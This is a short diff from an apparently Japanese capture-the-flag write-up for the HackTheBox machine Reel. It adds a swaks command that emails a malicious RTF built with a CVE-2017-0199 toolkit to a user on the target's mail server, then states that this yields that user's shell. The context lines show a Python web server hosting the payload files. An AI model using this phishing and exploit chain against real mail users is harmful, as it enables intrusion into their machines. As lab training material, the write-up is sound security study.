@@ -125,4 +125,14 @@ cve-2017-0199_toolkit.py  shell.hta  template  test.rtf
 └─$ python3 -m http.server   
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+`swaks`コマンドでメールを送る：
+
+```
+┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
+└─$ swaks --to nico@megabank.com --from kail@shoebill.com --server 10.10.10.77 --header "test rtf" --body "check my rtf file" --attach ./test.rtf
+```
+
+これでユーザnicoのシェルがとれる：
+
+![inishell](https://user-images.githubusercontent.com/85237728/198999395-7382a52b-278c-4873-82f7-6f86cb6e3a41.png)
 
